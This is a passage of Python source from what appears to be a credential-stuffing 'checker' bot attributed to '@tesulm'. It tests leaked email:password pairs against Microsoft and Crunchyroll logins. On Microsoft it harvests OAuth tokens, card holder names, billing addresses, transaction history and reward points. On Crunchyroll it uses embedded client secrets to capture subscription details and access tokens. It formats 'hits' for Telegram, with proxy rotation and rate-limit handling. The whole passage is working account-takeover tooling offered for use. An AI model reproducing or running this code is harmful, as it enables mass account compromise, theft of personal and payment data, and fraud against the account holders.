        payload_login = (
            f"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            f"&PPFT={MSFC_PPFT}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0"
            f"&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0"
            f"&isRecoveryAttemptPost=0&i13=1&login={email}&loginfmt={email}"
            f"&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit"
            f"&passwd={password}"
        )

        # FIX #2: full Cookie header restored
        headers_login = {
            "Host": "login.live.com",
            "Cache-Control": "max-age=0",
            "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid={MSFC_UAID}&display=touch&username={_quote(email)}",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": MSFC_COOKIE,
        }

        response_login = session.post(url_login, data=payload_login, headers=headers_login,
                                      allow_redirects=True, timeout=20)
        if not response_login:
            return {"status": "DEAD", "reason": "no_response", "email": email, "password": password}

        response_text = response_login.text
        response_url = response_login.url

        if "Your account or password is incorrect." in response_text or \
           "That Microsoft account doesn\\'t exist. Enter a different account" in response_text:
            return {"status": "DEAD", "reason": "bad_credentials", "email": email, "password": password}
        if ",AC:null,urlFedConvertRename" in response_text:
            return {"status": "DEAD", "reason": "account_locked", "email": email, "password": password}
        if "account.live.com/recover" in response_text or \
           "account.live.com/identity/confirm" in response_text or \
           "Email/Confirm" in response_text:
            return {"status": "2FA", "reason": "2fa_required", "email": email, "password": password}
        if "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
            return {"status": "DEAD", "reason": "account_locked_abuse", "email": email, "password": password}

        success_cookie_found = any(c.name in ("ANON", "WLSSC") for c in session.cookies)
        successful_redirect = (
            "oauth20_desktop.srf#access_token=" in response_url
            or "https://login.live.com/oauth20_desktop.srf?" in response_url
        )
        if not (successful_redirect or success_cookie_found):
            return {"status": "DEAD", "reason": "login_failed", "email": email, "password": password}

        # Step 2: OAuth token
        url_oauth = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=000000000004773A&response_type=token"
            "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
            "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
            "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
            "&prompt=none"
        )
        r_oauth = session.get(url_oauth, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": "https://account.microsoft.com/",
        }, allow_redirects=True, timeout=20)

        if "access_token=" not in r_oauth.url:
            return {"status": "DEAD", "reason": "no_oauth_token", "email": email, "password": password}

        token = msfc_extract(r_oauth.url, "access_token=", "&token_type")
        if not token:
            return {"status": "DEAD", "reason": "oauth_token_parse", "email": email, "password": password}
        token_decoded = _unquote(token)

        # Step 3: Payment instruments
        r_pay = session.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Authorization": f'MSADELEGATE1.0="{token_decoded}"',
                "Content-Type": "application/json",
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
            }, timeout=20,
        )
        if r_pay.status_code == 401:
            return {"status": "DEAD", "reason": "payment_unauthorized", "email": email, "password": password}
        if r_pay.status_code != 200:
            return {"status": "DEAD", "reason": f"payment_http_{r_pay.status_code}", "email": email, "password": password}

        pay_text = r_pay.text
        variables["Balance"]           = msfc_extract(pay_text, 'balance":', ',"')
        variables["CardTypeLast4"]     = msfc_extract(pay_text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
        variables["AccountHolderName"] = msfc_extract(pay_text, 'accountHolderName":"', '","')
        variables["Zipcode"]           = msfc_extract(pay_text, '"postal_code":"', '",')
        variables["Region"]            = msfc_extract(pay_text, '"region":"', '",')
        variables["Address1"]          = msfc_extract(pay_text, '"address_line1":"', '",')
        variables["City"]              = msfc_extract(pay_text, '"city":"', '",')

        # Step 4: Transactions
        r_tx = session.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Authorization": f'MSADELEGATE1.0="{token_decoded}"',
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
            }, timeout=20,
        )
        if r_tx.status_code == 200:
            tx_text = r_tx.text
            variables["Country"]                = msfc_extract(tx_text, 'country":"', '"}')
            variables["Item 1"]                 = msfc_extract(tx_text, 'title":"', '",')
            variables["autoRenew"]              = msfc_extract(tx_text, '"autoRenew":', ',')
            variables["startDate"]              = msfc_extract(tx_text, '"startDate":"', 'T')
            variables["nextRenewalDate"]        = msfc_extract(tx_text, '"nextRenewalDate":"', 'T')
            variables["TransactionDescription"] = msfc_extract(tx_text, 'description":"', '",')

        # Step 5: Rewards
        try:
            r_rew = session.get(
                "https://rewards.bing.com/",
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "*/*",
                }, timeout=15,
            )
            if r_rew.status_code == 200:
                pts = msfc_extract(r_rew.text, ',"availablePoints":', ',"')
                if not pts:
                    pts = msfc_extract(r_rew.text, 'pointsAvailable":', ',')
                variables["Points"] = pts or "N/A"
            else:
                variables["Points"] = "N/A"
        except Exception:
            variables["Points"] = "N/A"

        # Build result
        country         = variables.get("Country", "N/A") or "N/A"
        acc_holder      = variables.get("AccountHolderName", "") or ""
        card_holder_str = acc_holder if acc_holder and acc_holder != "N/A" else "No CC Linked"
        cc_funding      = variables.get("Balance", "N/A") or "N/A"
        item1           = variables.get("Item 1", "N/A") or "N/A"
        purchased_items = f"[{item1}]" if item1 != "N/A" else "[N/A]"
        auto_renew_val  = (variables.get("autoRenew", "N/A") or "N/A").lower()
        auto_renew_str  = "Yes" if auto_renew_val == "true" else ("No" if auto_renew_val == "false" else "N/A")
        start_date      = variables.get("startDate", "N/A") or "N/A"
        end_date        = variables.get("nextRenewalDate", "N/A") or "N/A"
        points          = variables.get("Points", "N/A") or "N/A"

        content = (
            f"{email}:{password} | Country = {country} | CardHolder = {card_holder_str} | "
            f"CC Funding = {cc_funding} | Purchased Items = {purchased_items} | "
            f"Auto Renew = {auto_renew_str} | Start in = {start_date} | End in = {end_date} | "
            f"Points = {points} | By = @tesulm"
        )

        return {
            "status":          "HIT",
            "email":           email,
            "password":        password,
            "country":         country,
            "card_holder":     card_holder_str,
            "cc_funding":      cc_funding,
            "purchased_items": purchased_items,
            "auto_renew":      auto_renew_str,
            "start_date":      start_date,
            "end_date":        end_date,
            "points":          points,
            "content":         content,
        }

    except requests.exceptions.Timeout:
        return {"status": "DEAD", "reason": "timeout", "email": email, "password": password}
    except Exception as e:
        return {"status": "DEAD", "reason": str(e)[:60], "email": email, "password": password}


def msfc_fmt_hit(r: dict) -> str:
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {MSFC_HIT} <b>MICROSOFT FULL CAP HIT</b>   ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email      :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password   :</b> <code>{r.get('password','?')}</code>\n"
        f"{E_COUNTRY}  <b>Country    :</b> <code>{r.get('country','N/A')}</code>\n"
        f"{MSFC_CARD}  <b>CardHolder :</b> <code>{r.get('card_holder','N/A')}</code>\n"
        f"{MSFC_HIT}  <b>CC Funding :</b> <code>{r.get('cc_funding','N/A')}</code>\n"
        f"{E_PLAN}  <b>Items      :</b> <code>{r.get('purchased_items','N/A')}</code>\n"
        f"{E_CLOCK}  <b>Auto Renew :</b> <code>{r.get('auto_renew','N/A')}</code>\n"
        f"{E_DATE}  <b>Start      :</b> <code>{r.get('start_date','N/A')}</code>\n"
        f"{E_DATE}  <b>End        :</b> <code>{r.get('end_date','N/A')}</code>\n"
        f"{E_STATS}  <b>Points     :</b> <code>{r.get('points','N/A')}</code>"
    )


def msfc_fmt_progress(done: int, total: int, hits: int, bad: int, tfa: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>MS Full Capture</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{MSFC_HIT} Hits : <b>{hits}</b>\n"
        f"{SS_DEAD} Bad  : <b>{bad}</b>\n"
        f"{MSFC_2FA} 2FA : <b>{tfa}</b>"
    )


def msfc_fmt_summary(total: int, hits: int, bad: int, tfa: int, elapsed: float) -> str:
    pct = f"{hits / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>MS Full Cap Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total : <b>{total}</b>\n"
        f"{MSFC_HIT} Hits  : <b>{hits}</b>  (<i>{pct}%</i>)\n"
        f"{SS_DEAD} Bad   : <b>{bad}</b>\n"
        f"{MSFC_2FA} 2FA  : <b>{tfa}</b>\n"
        f"{E_CLOCK} Time  : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ▼ CHUNK 4 END — PASTE CHUNK 5 BELOW THIS LINE ▼
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    CRUNCHYROLL CHECKER (FireTV) — FIXED                 ║
# ║  BUG FIX: HTTPAdapter with Retry restored (matching source _sess)       ║
# ╚══════════════════════════════════════════════════════════════════════════╝

CR_TOKEN_URL = "https://beta-api.crunchyroll.com/auth/v1/token"
CR_ME_URL = "https://beta-api.crunchyroll.com/accounts/v1/me"
CR_PROD_URL = "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{}/products"
CR_SUB_URL = "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{}"
CR_UA = "Crunchyroll/deviceType: FIRETV; appVersion: 3.67.0; osVersion: 8.1.7.4; model: AFTKA; manufacturer: Amazon; brand: Amazon"
CR_AUTH_HEADERS = {
    "Host": "beta-api.crunchyroll.com",
    "Authorization": "Basic YWJvdGxoMXdlcTByNGxudn5haHo6dWlLSjJqUXRVX0FQYzdZa0hqSWlDTFoyMjhnbGxOY2o=",
    "User-Agent": CR_UA,
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json",
    "Accept-Charset": "UTF-8",
    "Accept-Encoding": "gzip",
    "Connection": "Keep-Alive",
}
CR_BASE_HEADERS = {
    "host": "beta-api.crunchyroll.com",
    "User-Agent": CR_UA,
    "connection": "Keep-Alive",
}

CR_COUNTRY_MAP = {
    "US": "United States 🇺🇸", "GB": "United Kingdom 🇬🇧", "IN": "India 🇮🇳",
    "CA": "Canada 🇨🇦", "AU": "Australia 🇦🇺", "DE": "Germany 🇩🇪",
    "FR": "France 🇫🇷", "BR": "Brazil 🇧🇷", "MX": "Mexico 🇲🇽",
    "JP": "Japan 🇯🇵", "KR": "South Korea 🇰🇷", "TR": "Turkey 🇹🇷",
    "TH": "Thailand 🇹🇭", "PH": "Philippines 🇵🇭", "ID": "Indonesia 🇮🇩",
}


def cr_build_session(proxy: Optional[str] = None) -> requests.Session:
    """FIX: mount HTTPAdapter with retry on 429/5xx (matches source _sess)."""
    s = requests.Session()
    s.verify = False
    if _URLLIB3_RETRY_OK:
        adapter = HTTPAdapter(
            max_retries=Urllib3Retry(
                total=1,
                backoff_factor=1.5,
                status_forcelist=[429, 500, 502, 503, 504],
            )
        )
        s.mount("https://", adapter)
        s.mount("http://", adapter)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def cr_jget(obj, path: str, default: str = "") -> str:
    try:
        cur = obj
        for k in path.strip("$.").split("."):
            if "[" in k:
                n = k[:k.index("[")]
                i = int(k[k.index("[") + 1:k.index("]")])
                cur = cur[n][i]
            else:
                cur = cur[k]
        return str(cur) if cur is not None else default
    except Exception:
        return default


def cr_extract(source: str, left: str, right: str) -> str:
    try:
        i = source.index(left) + len(left)
        return source[i:source.index(right, i)]
    except Exception:
        return ""


def cr_check_one(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    """FireTV OAuth — HTTPAdapter retry enabled (FIXED)."""
    session = cr_build_session(proxy)
    try:
        try:
            r_login = session.post(
                CR_TOKEN_URL,
                headers=CR_AUTH_HEADERS,
                data={
                    "grant_type":    "password",
                    "username":      email,
                    "password":      password,
                    "scope":         "offline_access",
                    "client_id":     "abotlh1weq0r4lnvnahz",
                    "client_secret": "uiKJ2jQtU_APc7YkHjIiCLZ228gllNcj",
                    "device_type":   "FIRETV",
                    "device_id":     str(uuid.uuid4()),
                    "device_name":   "IncredibleDrops",
                },
                timeout=15,
            )
        except Exception as e:
            return {"status": "RETRY", "reason": str(e)[:60], "email": email, "password": password}

        body = r_login.text
        if any(x in body for x in ("error code: 1015", "just a moment", "too_many_requests")):
            return {"status": "RETRY", "reason": "rate_limited", "email": email, "password": password}

        if any(x in body for x in ("missing_required_field", "invalid_credentials", "force_password_reset")) \
                or r_login.status_code in (400, 401):
            return {"status": "FAIL", "reason": "bad_credentials", "email": email, "password": password}

        try:
            token_data = json.loads(body) if body else {}
        except Exception:
            token_data = {}
        access_token = token_data.get("access_token", "")
        if not access_token:
            return {"status": "FAIL", "reason": "no_access_token", "email": email, "password": password}

        headers_auth = {**CR_BASE_HEADERS, "authorization": f"Bearer {access_token}"}

        try:
            r_me = session.get(CR_ME_URL, headers=headers_auth, timeout=15)
        except Exception as e:
            return {"status": "RETRY", "reason": str(e)[:60], "email": email, "password": password}
        try:
            me_data = json.loads(r_me.text) if r_me.text else {}
        except Exception:
            me_data = {}
        uid = cr_jget(me_data, "$.external_id")

        try:
            r_prod = session.get(CR_PROD_URL.format(uid), headers=headers_auth, timeout=15)
        except Exception:
            r_prod = None
        try:
            prod_data = json.loads(r_prod.text) if r_prod and r_prod.text else {}
        except Exception:
            prod_data = {}

        items = prod_data.get("items", [])
        product = items[0].get("product", {}) if items else {}
        plan = str(product.get("sku", ""))
        currency = str(items[0].get("currency_code", "")) if items else ""
        is_subscribable = str(product.get("is_subscribable", ""))
        active_trial = str(items[0].get("active_free_trial", "")) if items else ""

        try:
            r_sub = session.get(CR_SUB_URL.format(uid), headers=headers_auth, timeout=15)
        except Exception:
            r_sub = None
        try:
            sub_data = json.loads(r_sub.text) if r_sub and r_sub.text else {}
        except Exception:
            sub_data = {}
        country_code = cr_jget(sub_data, "$.country_code")

        sub_body_lower = (r_sub.text if r_sub and r_sub.text else "").lower()
        is_custom = (
            '"is_cancelled":true' in sub_body_lower
            or is_subscribable == "False"
            or "subscription not found" in sub_body_lower
        )
        is_success = is_subscribable == "True"

        info = {
            "Verified": cr_jget(me_data, "$.email_verified", "N/A"),
            "Created":  cr_extract(r_me.text, '"created":"', "T") if r_me.text else "N/A",
            "Plan":     plan or "N/A",
            "Currency": currency or "N/A",
            "Subable":  is_subscribable or "N/A",
            "Trial":    active_trial or "N/A",
            "Expiry":   cr_jget(sub_data, "$.next_renewal_date", "N/A"),
            "Cycle":    cr_jget(sub_data, "$.cycle_duration", "N/A"),
            "Active":   cr_jget(sub_data, "$.is_active", "N/A"),
            "Country":  CR_COUNTRY_MAP.get(country_code, country_code) or "N/A",
            "Token":    access_token,
        }

        bits = [f"{k}={v}" for k, v in info.items() if v not in ("", "None", "False", "N/A")]
        content = f"{email}:{password}" + (" | " + " | ".join(bits) if bits else "")

        if is_custom:
            status = "CUSTOM"
        elif is_success:
            status = "SUCCESS"
        else:
            status = "CUSTOM"

        return {
            "status":   status,
            "email":    email,
            "password": password,
            "info":     info,
            "content":  content,
        }

    except Exception as e:
        return {"status": "RETRY", "reason": str(e)[:60], "email": email, "password": password}


def cr_check_token_only(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    r = cr_check_one(email, password, proxy)
    if r.get("status") in ("SUCCESS", "CUSTOM"):
        tok = r.get("info", {}).get("Token", "")
        return {
            "status":   "SUCCESS" if tok else "FAIL",
            "email":    email,
            "password": password,
            "token":    tok,
            "content":  f"{email}:{password} | Token = {tok}",
        }
    return r


def cr_fmt_hit(r: dict, sub_mode: str = "check") -> str:
    info = r.get("info", {})
    if sub_mode == "token":
        return (
            f"╔══════════════════════════════╗\n"
            f"║  {CR_ICON} <b>CRUNCHYROLL TOKEN</b>        ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"{E_EMAIL}  <b>Email :</b> <code>{r.get('email','?')}</code>\n"
            f"{E_PLAN}  <b>Pass  :</b> <code>{r.get('password','?')}</code>\n"
            f"{CR_TOKEN}  <b>Token :</b> <code>{r.get('token','?')[:80]}…</code>"
        )
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {CR_PREMIUM} <b>CRUNCHYROLL HIT</b>         ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email    :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password :</b> <code>{r.get('password','?')}</code>\n"
        f"{E_PLAN}  <b>Plan     :</b> <code>{info.get('Plan','N/A')}</code>\n"
        f"{E_COUNTRY}  <b>Country  :</b> <code>{info.get('Country','N/A')}</code>\n"
        f"{E_DATE}  <b>Expiry   :</b> <code>{info.get('Expiry','N/A')}</code>\n"
        f"{E_CLOCK}  <b>Cycle    :</b> <code>{info.get('Cycle','N/A')}</code>\n"
        f"{E_PLAN}  <b>Currency :</b> <code>{info.get('Currency','N/A')}</code>\n"
        f"{CR_PREMIUM}  <b>Trial    :</b> <code>{info.get('Trial','N/A')}</code>"
    )


def cr_fmt_custom(r: dict) -> str:
    info = r.get("info", {})
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {CR_RETRY} <b>CRUNCHYROLL CUSTOM</b>      ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email  :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Pass   :</b> <code>{r.get('password','?')}</code>\n"
        f"{E_PLAN}  <b>Plan   :</b> <code>{info.get('Plan','N/A')}</code>\n"
        f"{E_COUNTRY}  <b>Country:</b> <code>{info.get('Country','N/A')}</code>\n"
        f"{CR_RETRY}  <b>Status :</b> <code>Cancelled/Expired</code>"
    )


def cr_fmt_fail(r: dict) -> str:
    return (
        f"{CR_FAIL}  <b>DEAD — {r.get('email','?')}</b>\n"
        f"<i>{r.get('reason','invalid_credentials')}</i>"
    )


def cr_fmt_progress(done: int, total: int, hits: int, custom: int, fail: int, retry: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>Crunchyroll Checker</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{CR_PREMIUM} Hits   : <b>{hits}</b>\n"
        f"{CR_RETRY} Custom : <b>{custom}</b>\n"
        f"{CR_FAIL} Fail   : <b>{fail}</b>\n"
        f"{SP_BOLT} Retry  : <b>{retry}</b>"
    )


def cr_fmt_summary(total: int, hits: int, custom: int, fail: int, retry: int, elapsed: float) -> str:
    pct = f"{hits / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>Crunchyroll Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total  : <b>{total}</b>\n"
        f"{CR_PREMIUM} Hits   : <b>{hits}</b>  (<i>{pct}%</i>)\n"
        f"{CR_RETRY} Custom : <b>{custom}</b>\n"
        f"{CR_FAIL} Fail   : <b>{fail}</b>\n"
        f"{SP_BOLT} Retry  : <b>{retry}</b>\n"
        f"{E_CLOCK} Time   : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    CRUNCHYROLL 2 — SSO PKCE — FIXED                     ║
# ║  BUG FIX: HTTPAdapter retry restored, cleaner UA reference              ║
# ╚══════════════════════════════════════════════════════════════════════════╝

CR2_CHANNEL = "https://t.me/Tesulm"
CR2_LOGIN_URL = "https://sso.crunchyroll.com/api/login"
CR2_SSO = "https://sso.crunchyroll.com"
CR2_AUTHORIZE_CANDIDATES = [CR2_SSO + "/authorize", CR2_SSO + "/api/authorize"]
CR2_TOKEN_CANDIDATES = [CR2_SSO + "/api/token", CR2_SSO + "/token"]
CR2_ACCOUNT_CANDIDATES = [
    "https://www.crunchyroll.com/api/account/v1/account/me",
    "https://api.crunchyroll.com/account/v1/account/me",
    "https://api.crunchyroll.com/auth/v1/me",
    "https://www.crunchyroll.com/api/account/v1/account",
    "https://api.crunchyroll.com/subs/v1/subscriptions",
    "https://www.crunchyroll.com/api/subs/v1/subscriptions",
]
CR2_CLIENT_ID = "tgzer4iuwgpakycik88w"
CR2_REDIRECT_URI = "sso.crunchyroll://auth"
CR2_SCOPE = "offline_access"
CR2_CODE_CHALLENGE = "558779a9-90ab-4491-a88c-defff1fffc4f"
CR2_CODE_CHALLENGE_METHOD = "plain"
CR2_STATE = '{"flow":"SIGN_IN","flowRoot":"ONBOARDING"}'
CR2_ANON_ID = "4327e60e-5221-4445-990f-3f1aa1dd9f3a"
CR2_DEFAULT_REFERER = (
    "https://sso.crunchyroll.com/ar/login?return_url=%2Fauthorize%3F"
    "client_id%3Dtgzer4iuwgpakycik88w%26redirect_uri%3Dsso.crunchyroll%253A%252F%252Fauth"
    "%26response_type%3Dcode%26scope%3Doffline_access%26state%3D%257B%2522flow%2522%253A"
    "%2522SIGN_IN%2522%252C%2522flowRoot%2522%253A%2522ONBOARDING%2522%257D"
    "%26code_challenge%3D558779a9-90ab-4491-a88c-defff1fffc4f%26code_challenge_method%3Dplain"
    "&mode=android&dc=1&hf=1&anonymous_id=" + CR2_ANON_ID
)
CR2_DEFAULT_UA = (
    "Mozilla/5.0 (Linux; Android 16; 2412DPC0AG Build/BP2A.250605.031.A3; wv) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/153.0.8010.36 Mobile Safari/537.36"
)
CR2_DEFAULT_COOKIE = (
    "c_locale=ar-SA; NEXT_LOCALE=ar; ajs_anonymous_id=" + CR2_ANON_ID +
    "; sso_client_name=CR%20Android; client_id=" + CR2_CLIENT_ID
)
CR2_PREMIUM_MARKERS = [
    "mega fan", "megafan", "mega_fan", "ultimate fan", "ultimatefan",
    '"tier":"mega', '"tier":"fan', '"plan":"mega', '"plan":"fan',
    'is_premium":true', 'ispremium":true', 'premium":true',
    "subscription_active", 'has_subscription":true', "gold", "paid", "premium",
]
CR2_FREE_MARKERS = [
    "free", "no_subscription", "nosubscription", "not_subscribed",
    "expired", "canceled", "cancelled",
]


def cr2_build_session(proxy: Optional[str] = None) -> requests.Session:
    """FIX: HTTPAdapter retry mounted (matches source)."""
    s = requests.Session()
    s.verify = False
    if _URLLIB3_RETRY_OK:
        adapter = HTTPAdapter(
            max_retries=Urllib3Retry(
                total=1,
                backoff_factor=1.5,
                status_forcelist=[429, 500, 502, 503, 504],
            )
        )
        s.mount("https://", adapter)
        s.mount("http://", adapter)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def cr2_base_headers(referer: Optional[str] = None) -> Dict[str, str]:
    return {
        "User-Agent": CR2_DEFAULT_UA,
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua": '"Android WebView";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
        "sec-ch-ua-mobile": "?1",
        "origin": CR2_SSO,
        "x-requested-with": "com.crunchyroll.crunchyroid",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": referer or CR2_DEFAULT_REFERER,
        "accept-language": "en-US,en;q=0.9,ar;q=0.8",
        "priority": "u=1, i",
        "Cookie": CR2_DEFAULT_COOKIE,
    }


def cr2_build_headers(body_bytes: bytes) -> Dict[str, str]:
    h = cr2_base_headers()
    h["Content-Type"] = "application/json"
    h["x-amz-content-sha256"] = hashlib.sha256(body_bytes).hexdigest()
    return h


def cr2_extract_code(text: str, location: str) -> str:
    if location and "code=" in location:
        c = parse_qs(urlparse(location).query).get("code", [None])[0]
        if c:
            return c
    try:
        js = json.loads(text)
        if isinstance(js, dict):
            if isinstance(js.get("data"), dict) and js["data"].get("code"):
                return js["data"]["code"]
            if js.get("code"):
                return js["code"]
    except Exception:
        pass
    if "code=" in text:
        for chunk in text.split("code=")[1:]:
            cand = chunk.split("&")[0].split('"')[0].split("'")[0].strip()
            if cand and len(cand) > 4:
                return cand
    return ""


def cr2_get_access_token(session) -> str:
    params = {
        "client_id": CR2_CLIENT_ID, "redirect_uri": CR2_REDIRECT_URI,
        "response_type": "code", "scope": CR2_SCOPE, "state": CR2_STATE,
        "code_challenge": CR2_CODE_CHALLENGE,
        "code_challenge_method": CR2_CODE_CHALLENGE_METHOD,
    }
    qs = urlencode(params)
    code = ""
    for base in CR2_AUTHORIZE_CANDIDATES:
        url = base + "?" + qs
        try:
            r = session.get(url, headers=cr2_base_headers(referer=base),
                            timeout=12, allow_redirects=False, verify=False)
            code = cr2_extract_code(r.text or "", r.headers.get("location", ""))
            if not code:
                r2 = session.get(url, headers=cr2_base_headers(referer=base),
                                 timeout=12, allow_redirects=True, verify=False)
                code = cr2_extract_code(r2.text, r2.url)
        except Exception:
            continue
        if code:
            break
    if not code:
        return ""

    payload = {
        "grant_type": "authorization_code", "code": code,
        "code_verifier": CR2_CODE_CHALLENGE, "client_id": CR2_CLIENT_ID,
        "redirect_uri": CR2_REDIRECT_URI,
    }
    body = json.dumps(payload, separators=(",", ":")).encode()
    for url in CR2_TOKEN_CANDIDATES:
        try:
            r = session.post(url, data=body, headers=cr2_build_headers(body),
                             timeout=12, verify=False)
            js = r.json() if r.text.strip().startswith("{") else None
            if isinstance(js, dict) and js.get("access_token"):
                return js["access_token"]
            r2 = session.post(url, data=payload, headers=cr2_base_headers(referer=url),
                              timeout=12, verify=False)
            js2 = r2.json() if r2.text.strip().startswith("{") else None
            if isinstance(js2, dict) and js2.get("access_token"):
                return js2["access_token"]
        except Exception:
            continue
    return ""


def cr2_detect_tier(text: str) -> Tuple[str, str]:
    low = text.lower()
    for m in CR2_PREMIUM_MARKERS:
        if m in low:
            return "PREMIUM", m
    for m in CR2_FREE_MARKERS:
        if m in low:
            return "FREE", m
    return "UNKNOWN", ""


def cr2_probe_account(session, token: str) -> Tuple[str, str, str]:
    hdrs = cr2_base_headers()
    if token:
        hdrs["Authorization"] = f"Bearer {token}"
    detail = []
    for url in CR2_ACCOUNT_CANDIDATES:
        try:
            r = session.get(url, headers=hdrs, timeout=12, verify=False)
        except Exception as e:
            detail.append(f"{url} -> {type(e).__name__}")
            continue
        body = r.text or ""
        detail.append(f"{url} -> {r.status_code} {body[:200]}")
        if r.status_code == 200 and body.strip().startswith("{"):
            tier, ev = cr2_detect_tier(body)
            if tier != "UNKNOWN":
                return tier, ev, " | ".join(detail)
    return "UNKNOWN", "", " | ".join(detail)


def cr2_classify(status: int, text: str) -> Tuple[str, str]:
    low = text.lower()
    if status == 429 or "too many" in low:
        return "ERR", "429 rate-limited"
    try:
        js = json.loads(text)
    except Exception:
        js = None
    if isinstance(js, dict):
        if str(js.get("status", "")).lower() == "ok":
            flow = ""
            if isinstance(js.get("data"), dict):
                flow = js["data"].get("flow", "")
            return "VALID", f"flow={flow or '?'}"
        if js.get("access_token") or js.get("refresh_token"):
            return "VALID", "tokens in body"
        err = str(js.get("error", "") or js.get("error_description", "") or js.get("message", ""))
        el = err.lower()
        if "mfa" in el or "otp" in el or "challenge" in el or js.get("mfa_required"):
            return "MFA", f"2FA ({err or 'challenge'})"
        if "captcha" in el or "recaptcha" in el:
            return "CAP", f"captcha ({err})"
        if any(k in el for k in ("invalid_credentials", "invalid_grant", "incorrect",
                                  "wrong", "unauthor", "not found", "does not exist")):
            return "INVALID", f"invalid ({err})"
        if err:
            return "ERR", f"error ({err})"
    if "captcha" in low:
        return "CAP", "captcha rejected"
    if status in (400, 401, 403):
        return "INVALID", f"http {status}"
    return "ERR", f"http {status}"


